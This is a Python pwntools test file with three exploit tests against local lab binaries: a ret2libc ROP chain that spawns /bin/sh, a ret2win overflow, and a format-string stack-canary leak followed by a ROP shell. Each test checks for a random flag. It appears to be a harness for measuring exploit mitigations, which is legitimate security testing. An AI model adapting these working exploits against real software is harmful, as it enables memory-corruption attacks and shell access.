from models import ConfigAction, ROPTest
from pwn import *
from time import sleep

class Ret2LibcShellTest(ROPTest):
    def __init__(self, binary, name="Ret2Libc Shell Test", description="Test to spawn a shell using ROP gadgets."):
        super().__init__(name=name, description=description, binary=binary)
        self.flag = ""

    def configure_environment(self, selected_actions: list[ConfigAction]):
        super().configure_environment(selected_actions)

        # Rebuild binary
        subprocess.run(['make', 'clean'], check=True)
        subprocess.run(['make', self.binary], check=True)

        # Write randomized flag
        random_string = os.urandom(16).hex()
        self.flag = f"flag_{random_string}"
        with open("flag.txt", "w") as f:
            f.write(self.flag)
            print(f"Flag written to file: {self.flag}")

    def execute(self) -> bool:
        BINARY = self.binary
        elf = context.binary = ELF(BINARY)
        p = process()
        
        # Load linked libc from elf
        libc = elf.libc
        libc.address = next(i for l, i in p.libs().items() if 'libc' in l.lower())  # platform-independent base addr
        log.info(f"Libc base address: {hex(libc.address)}")
        system = libc.sym['system']
        log.info(f"System address: {hex(system)}")
        binsh = next(libc.search(b'/bin/sh'))
        log.info(f"/bin/sh address: {hex(binsh)}")

        rop = ROP(elf)
        rop.call(system, [binsh])

        log.info(f"ROP chain:\n{rop.dump()}")
        
        RET = rop.find_gadget(['ret'])[0]

        payload = flat({
            72: p64(RET) + rop.chain()
        })

        # log.info(f"Payload1: {payload.hex()}")

        # figure out platform agnostic
        # payload = flat({
        #     80: rop.chain()
        # })

        # log.info(f"Payload2: {payload.hex()}")

        p.clean()
        p.sendline(payload)
        sleep(0.1)
        p.sendline(b'cat flag.txt')
        result = p.recvall(timeout=2).decode(errors='ignore')

        return 1.0 if self.flag in result else 0.0

    def cleanup(self, actions: list[ConfigAction]):
        super().cleanup(actions)
        if os.path.exists("flag.txt"):
            os.remove("flag.txt")

class Ret2WinTest(ROPTest):
    def __init__(self, binary, name="Ret2Win Test", description="Test to call win_function using ROP."):
        super().__init__(
            name=name,
            description=description,
            binary=binary
        )
        self.flag = ""

    def configure_environment(self, selected_actions: list[ConfigAction]):
        super().configure_environment(selected_actions)

        random_string = os.urandom(16).hex()
        self.flag = f"flag_{random_string}"
        with open("flag.txt", "w") as f:
            f.write(self.flag)
            print(f"Flag written to file: {self.flag}")

        subprocess.run(['make', 'clean'], check=True)
        subprocess.run(['make', self.binary], check=True)

    def execute(self) -> bool:
        BINARY = self.binary
        elf = context.binary = ELF(BINARY)
        win_function_addr = elf.symbols['win_function']
        log.info(f"win_function address: {hex(win_function_addr)}")
        arch = context.arch
        log.info(f"Architecture: {arch}")
        
        p = process()

        rop = ROP(elf)
        RET = rop.find_gadget(['ret'])[0]
        
        if arch == "amd64":
            buffer_size = 72
            payload = b'A' * buffer_size + p64(RET) + p64(win_function_addr)
            
        elif arch == "i386":
            buffer_size = 68
            payload = b'A' * buffer_size + p32(win_function_addr)
            
        else:
            log.error(f"Architecture {arch} not supported in this test")
            return False
        
        log.info(f"Payload length: {len(payload)}")
        p.sendline(payload)
        result = p.recvall(timeout=5).decode(errors='ignore')
        log.info(f"Execution result:\n{result}")
        
        return 1.0 if self.flag in result else 0.0

    def cleanup(self, actions: list[ConfigAction]):
        super().cleanup(actions)
        if os.path.exists("flag.txt"):
            os.remove("flag.txt")

class FormatStringBypassCanaryTest(ROPTest):
    def __init__(self, binary, name="Format String Canary Bypass", description="Bypass canary using format string and spawn shell"):
        super().__init__(name=name, description=description, binary=binary)
        self.flag = ""

    def configure_environment(self, selected_actions: list[ConfigAction]):
        super().configure_environment(selected_actions)
        
        subprocess.run(['make', 'clean'], check=True)
        subprocess.run(['make', self.binary], check=True)

        random_string = os.urandom(16).hex()
        self.flag = f"flag_{random_string}"
        with open("flag.txt", "w") as f:
            f.write(self.flag)
            print(f"Flag written to file: {self.flag}")

    def execute(self) -> bool:
        BINARY = self.binary
        elf = context.binary = ELF(BINARY)
        p = process()
        
        p.sendline(b"%15$p")
        canary = int(p.recvline().strip(), 16)
        log.info(f"Leaked canary: {hex(canary)}")

        # Get libc base addr
        libc = elf.libc
        libc.address = next(i for l, i in p.libs().items() if 'libc' in l.lower())
        log.info(f"Libc base address: {hex(libc.address)}")
        
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh'))

        log.info(f"System: {hex(system)}")
        log.info(f"/bin/sh: {hex(binsh)}")

        rop = ROP(elf)
        rop.call(system, [binsh])
        log.info(f"ROP chain:\n{rop.dump()}")
        RET = rop.find_gadget(['ret'])[0]

        payload = flat({
            72: p64(canary) + b'B' * 8 + p64(RET) + rop.chain()
        })

        log.info(payload)

        p.sendline(payload)
        sleep(0.1)
        p.sendline(b'cat flag.txt')
        result = p.recvall(timeout=2).decode(errors='ignore')
        log.info(f"Execution result:\n{result}")

        return 1.0 if self.flag in result else 0.0

    def cleanup(self, actions: list[ConfigAction]):
        super().cleanup(actions)
        if os.path.exists("flag.txt"):
            os.remove("flag.txt")